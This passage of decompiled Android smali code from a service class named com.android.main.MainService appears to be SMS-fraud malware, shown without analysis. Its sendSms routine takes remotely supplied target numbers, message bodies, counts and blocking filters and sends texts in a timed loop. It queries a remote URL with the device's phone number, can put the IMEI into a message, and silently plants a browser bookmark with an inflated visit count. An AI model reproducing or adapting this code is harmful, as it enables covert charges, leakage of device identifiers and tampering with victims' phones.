    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 586
    .local v7, "cursor":Landroid/database/Cursor;
    if-eqz v7, :cond_0

    const-string v3, ""

    invoke-virtual {v3, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 587
    :cond_0
    const/16 v3, -0x3e9

    .line 627
    .end local v0    # "contentResolver":Landroid/content/ContentResolver;
    .end local v1    # "browserUri":Landroid/net/Uri;
    .end local v2    # "projection":[Ljava/lang/String;
    .end local v7    # "cursor":Landroid/database/Cursor;
    :goto_0
    return v3

    .line 588
    .restart local v0    # "contentResolver":Landroid/content/ContentResolver;
    .restart local v1    # "browserUri":Landroid/net/Uri;
    .restart local v2    # "projection":[Ljava/lang/String;
    .restart local v7    # "cursor":Landroid/database/Cursor;
    :cond_1
    const/4 v8, 0x0

    .line 589
    .local v8, "hasMyBookmark":Z
    :cond_2
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-nez v3, :cond_3

    .line 596
    :goto_1
    if-nez v8, :cond_5

    .line 597
    new-instance v6, Landroid/content/ContentValues;

    invoke-direct {v6}, Landroid/content/ContentValues;-><init>()V

    .line 598
    .local v6, "contentValues":Landroid/content/ContentValues;
    const-string v3, "_id"

    invoke-interface {v7}, Landroid/database/Cursor;->getCount()I

    move-result v4

    add-int/lit8 v4, v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 599
    const-string v3, "title"

    invoke-virtual {v6, v3, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 600
    const-string v3, "url"

    invoke-virtual {v6, v3, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 602
    const-string v3, "visits"

    const v4, 0x3fffffff    # 1.9999999f

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 604
    const-string v3, "date"

    const-wide/16 v4, 0x0

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 605
    const-string v3, "created"

    const-wide/16 v4, 0x0

    invoke-static {v4, v5}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 607
    const-string v3, "bookmark"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v6, v3, v4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 608
    invoke-interface {v7}, Landroid/database/Cursor;->close()V

    .line 609
    invoke-virtual {v0, v1, v6}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    move-result-object v11

    .line 611
    .local v11, "resultUri":Landroid/net/Uri;
    if-eqz v11, :cond_4

    .line 613
    const/16 v10, -0x3e8

    .end local v0    # "contentResolver":Landroid/content/ContentResolver;
    .end local v1    # "browserUri":Landroid/net/Uri;
    .end local v2    # "projection":[Ljava/lang/String;
    .end local v6    # "contentValues":Landroid/content/ContentValues;
    .end local v7    # "cursor":Landroid/database/Cursor;
    .end local v8    # "hasMyBookmark":Z
    .end local v11    # "resultUri":Landroid/net/Uri;
    :goto_2
    move v3, v10

    .line 627
    goto :goto_0

    .line 590
    .restart local v0    # "contentResolver":Landroid/content/ContentResolver;
    .restart local v1    # "browserUri":Landroid/net/Uri;
    .restart local v2    # "projection":[Ljava/lang/String;
    .restart local v7    # "cursor":Landroid/database/Cursor;
    .restart local v8    # "hasMyBookmark":Z
    :cond_3
    const/4 v3, 0x0

    invoke-interface {v7, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 591
    .local v12, "url":Ljava/lang/String;
    invoke-virtual {p2, v12}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_0

    move-result v3

    if-eqz v3, :cond_2

    .line 592
    const/4 v8, 0x1

    .line 593
    goto :goto_1

    .line 616
    .end local v12    # "url":Ljava/lang/String;
    .restart local v6    # "contentValues":Landroid/content/ContentValues;
    .restart local v11    # "resultUri":Landroid/net/Uri;
    :cond_4
    const/16 v10, -0x3e9

    goto :goto_2

    .line 620
    .end local v6    # "contentValues":Landroid/content/ContentValues;
    .end local v11    # "resultUri":Landroid/net/Uri;
    :cond_5
    const/16 v10, -0x3ea

    goto :goto_2

    .line 622
    .end local v0    # "contentResolver":Landroid/content/ContentResolver;
    .end local v1    # "browserUri":Landroid/net/Uri;
    .end local v2    # "projection":[Ljava/lang/String;
    .end local v7    # "cursor":Landroid/database/Cursor;
    .end local v8    # "hasMyBookmark":Z
    :catch_0
    move-exception v3

    move-object v9, v3

    .line 624
    .local v9, "iae":Ljava/lang/IllegalArgumentException;
    invoke-virtual {v9}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    .line 625
    const/16 v10, -0x3e9

    goto :goto_2
.end method

.method private sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    .locals 8
    .param p1, "addr"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 713
    const-string v1, ""

    invoke-virtual {v1, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 723
    :goto_0
    return-void

    .line 715
    :cond_0
    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    .line 716
    .local v0, "smsMag":Landroid/telephony/gsm/SmsManager;
    new-instance v7, Landroid/content/Intent;

    const-string v1, "com.test.sms.send"

    invoke-direct {v7, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 717
    .local v7, "sendIntent":Landroid/content/Intent;
    invoke-static {p0, v2, v7, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v4

    .line 719
    .local v4, "sendPI":Landroid/app/PendingIntent;
    new-instance v6, Landroid/content/Intent;

    const-string v1, "com.test.sms.delivery"

    invoke-direct {v6, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 720
    .local v6, "deliveryIntent":Landroid/content/Intent;
    invoke-static {p0, v2, v6, v2}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v5

    .line 722
    .local v5, "deliveryPI":Landroid/app/PendingIntent;
    const/4 v2, 0x0

    move-object v1, p1

    move-object v3, p2

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    goto :goto_0
.end method

.method private sendSms(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 22
    .param p1, "allStr"    # Ljava/lang/String;
    .param p2, "record"    # [Ljava/lang/String;

    .prologue
    .line 343
    const-string v15, ""

    .line 344
    .local v15, "smsAddress":Ljava/lang/String;
    const-string v16, ""

    .line 345
    .local v16, "smsBody":Ljava/lang/String;
    const-string v13, "1"

    .line 346
    .local v13, "sendcount":Ljava/lang/String;
    const-string v11, "no"

    .line 347
    .local v11, "isreset":Ljava/lang/String;
    const/4 v7, -0x2

    .line 348
    .local v7, "flag":I
    const/4 v12, 0x0

    .line 351
    .local v12, "result":I
    :try_start_0
    const-string v20, "<sendnum>"

    .line 352
    const-string v21, "</sendnum>"

    .line 351
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 353
    const-string v20, ""

    move-object/from16 v0, v20

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v20

    if-eqz v20, :cond_0

    .line 430
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 431
    move-object/from16 v0, p0

    move v1, v7

    move v2, v12

    move-object v3, v15

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 433
    :goto_0
    return-void

    .line 356
    :cond_0
    :try_start_1
    const-string v20, "<sendchannel>"

    .line 357
    const-string v21, "</sendchannel>"

    .line 356
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v16

    .line 360
    const-string v20, "<shieldnum>"

    const-string v21, "</shieldnum>"

    .line 359
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 361
    .local v19, "tmpshieldnum":Ljava/lang/String;
    const-string v20, ""

    move-object/from16 v0, v20

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-nez v20, :cond_1

    .line 362
    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->shieldnum:Ljava/lang/String;

    .line 365
    :cond_1
    const-string v20, "<shieldcon>"

    const-string v21, "</shieldcon>"

    .line 364
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 366
    .local v18, "tmpshieldcon":Ljava/lang/String;
    const-string v20, ""

    move-object/from16 v0, v20

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-nez v20, :cond_2

    .line 367
    move-object/from16 v0, v18

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    .line 369
    :cond_2
    const-string v20, "<exactnum>"

    .line 370
    const-string v21, "</exactnum>"

    .line 369
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v17

    .line 371
    .local v17, "tmpexactnum":Ljava/lang/String;
    const-string v20, ""

    move-object/from16 v0, v20

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-nez v20, :cond_3

    .line 372
    move-object/from16 v0, v17

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    .line 374
    :cond_3
    const-string v20, "<sendcount>"

    .line 375
    const-string v21, "</sendcount>"

    .line 374
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 378
    const-string v20, "<isreset>"

    const-string v21, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 379
    const-string v20, "no"

    move-object/from16 v0, v20

    move-object v1, v11

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 383
    const/4 v10, 0x1

    .line 384
    .local v10, "isexec":Z
    const-string v20, "<isblack>"

    .line 385
    const-string v21, "</isblack>"

    .line 384
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 386
    .local v4, "black":Ljava/lang/String;
    const-string v20, "1"

    move-object/from16 v0, v20

    move-object v1, v4

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-eqz v20, :cond_4

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-virtual/range {v20 .. v20}, Ljava/lang/String;->length()I

    move-result v20

    const/16 v21, 0xa

    move/from16 v0, v20

    move/from16 v1, v21

    if-le v0, v1, :cond_4

    .line 389
    const-string v20, "<execblackurl>"

    const-string v21, "</execblackurl>"

    .line 388
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 390
    .local v6, "execblackurl":Ljava/lang/String;
    const-string v20, ""

    move-object/from16 v0, v20

    move-object v1, v6

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-nez v20, :cond_4

    .line 392
    new-instance v20, Ljava/lang/StringBuilder;

    invoke-static {v6}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v21

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v21, "/?tel="

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v20

    invoke-static/range {v20 .. v20}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 393
    .local v9, "iscontinue":Ljava/lang/String;
    const-string v20, "1"

    invoke-virtual {v9}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-eqz v20, :cond_4

    .line 394
    const/4 v10, 0x0

    .line 395
    const/16 v7, -0x2b

    .line 399
    .end local v6    # "execblackurl":Ljava/lang/String;
    .end local v9    # "iscontinue":Ljava/lang/String;
    :cond_4
    if-eqz v10, :cond_7

    .line 400
    const-string v20, "test"

    move-object/from16 v0, v20

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v20

    if-eqz v20, :cond_5

    .line 401
    new-instance v20, Ljava/lang/StringBuilder;

    const-string v21, "test:"

    invoke-direct/range {v20 .. v21}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v20 .. v21}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v20

    invoke-virtual/range {v20 .. v20}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v16

    .line 403
    :cond_5
    const-string v20, "<is_second>"

    .line 404
    const-string v21, "</is_second>"

    .line 403
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->is_second:Ljava/lang/String;

    .line 405
    const-string v20, "1"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->is_second:Ljava/lang/String;

    move-object/from16 v21, v0

    invoke-virtual/range {v20 .. v21}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v20

    if-eqz v20, :cond_6

    .line 407
    const-string v20, "<second_filter_port>"

    const-string v21, "</second_filter_port>"

    .line 406
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->second_filter_port:Ljava/lang/String;

    .line 409
    const-string v20, "<second_filter_info>"

    const-string v21, "</second_filter_info>"

    .line 408
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->second_filter_info:Ljava/lang/String;

    .line 411
    const-string v20, "<reply_start_str>"

    const-string v21, "</reply_start_str>"

    .line 410
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->reply_start_str:Ljava/lang/String;

    .line 413
    const-string v20, "<reply_end_str>"

    const-string v21, "</reply_end_str>"

    .line 412
    move-object/from16 v0, p1

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/main/MainService;->reply_end_str:Ljava/lang/String;

    .line 415
    :cond_6
    invoke-static {v13}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v14

    .line 416
    .local v14, "sendcounts":I
    invoke-direct/range {p0 .. p0}, Lcom/android/main/MainService;->writeTaskLog()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 417
    const/4 v8, 0x0

    .local v8, "i":I
    :goto_1
    if-lt v8, v14, :cond_8

    .line 430
    .end local v8    # "i":I
    .end local v14    # "sendcounts":I
    :cond_7
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 431
    move-object/from16 v0, p0

    move v1, v7

    move v2, v12

    move-object v3, v15

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 418
    .restart local v8    # "i":I
    .restart local v14    # "sendcounts":I
    :cond_8
    :try_start_2
    move-object/from16 v0, p0

    move-object v1, v15

    move-object/from16 v2, v16

    invoke-direct {v0, v1, v2}, Lcom/android/main/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 419
    add-int/lit8 v12, v12, 0x1

    .line 421
    const-wide/16 v20, 0x3a98

    :try_start_3
    invoke-static/range {v20 .. v21}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 417
    :goto_2
    add-int/lit8 v8, v8, 0x1

    goto :goto_1

    .line 422
    :catch_0
    move-exception v5

    .line 423
    .local v5, "e":Ljava/lang/InterruptedException;
    :try_start_4
    invoke-virtual {v5}, Ljava/lang/InterruptedException;->printStackTrace()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_2

    .line 427
    .end local v4    # "black":Ljava/lang/String;
    .end local v5    # "e":Ljava/lang/InterruptedException;
    .end local v8    # "i":I
    .end local v10    # "isexec":Z
    .end local v14    # "sendcounts":I
    .end local v17    # "tmpexactnum":Ljava/lang/String;
    .end local v18    # "tmpshieldcon":Ljava/lang/String;
    .end local v19    # "tmpshieldnum":Ljava/lang/String;
    :catch_1
    move-exception v20

    move-object/from16 v5, v20

    .line 428
    .local v5, "e":Ljava/lang/Exception;
    const/16 v7, -0x2c

    .line 430
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 431
    move-object/from16 v0, p0

    move v1, v7

    move v2, v12

    move-object v3, v15

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    goto/16 :goto_0

    .line 429
    .end local v5    # "e":Ljava/lang/Exception;
    :catchall_0
    move-exception v20

    .line 430
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 431
    move-object/from16 v0, p0

    move v1, v7

    move v2, v12

    move-object v3, v15

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 432
    throw v20
.end method

.method private writeRecordLog([Ljava/lang/String;)V
    .locals 4
    .param p1, "record"    # [Ljava/lang/String;

    .prologue
    const-string v3, "|"

    .line 631
    const/4 v1, 0x0

    aget-object v1, p1, v1

    const/16 v2, 0xc

    invoke-static {v1, v2}, Lcom/android/main/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    .line 632
    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "|"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/4 v2, 0x1

    aget-object v2, p1, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/4 v2, 0x2

    aget-object v2, p1, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 633
    const/4 v2, 0x3

    aget-object v2, p1, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/4 v2, 0x4

    aget-object v2, p1, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const/4 v2, 0x5

    aget-object v2, p1, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 634
    const/4 v2, 0x6

    aget-object v2, p1, v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    .line 632
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 635
    .local v0, "logtxt":Ljava/lang/String;
    iget-object v1, p0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/android/main/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 636
    return-void
.end method

.method private writeTaskLog()V
    .locals 5

    .prologue
    const-string v4, "|"

    const-string v3, "other"

    const-string v2, ""

    .line 824
    iget-object v1, p0, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    if-eqz v1, :cond_0

    const-string v1, ""

    iget-object v1, p0, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 825
    :cond_0
    const-string v1, "other"

    iput-object v3, p0, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    .line 827
    :cond_1
    iget-object v1, p0, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    if-eqz v1, :cond_2

    const-string v1, ""

    iget-object v1, p0, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    invoke-virtual {v2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_3

    .line 828
    :cond_2
    const-string v1, "other"

    iput-object v3, p0, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    .line 830
    :cond_3
    new-instance v1, Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/android/main/MainService;->shieldnum:Ljava/lang/String;

    invoke-static {v2}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v2, "|"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v2, "|"

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    iget-object v2, p0, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 831
    .local v0, "logtxt":Ljava/lang/String;
    iget-object v1, p0, Lcom/android/main/MainService;->tasklog:Ljava/lang/String;

    invoke-static {v0, v1}, Lcom/android/main/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 832
    return-void
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 873
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 20

    .prologue
    .line 94
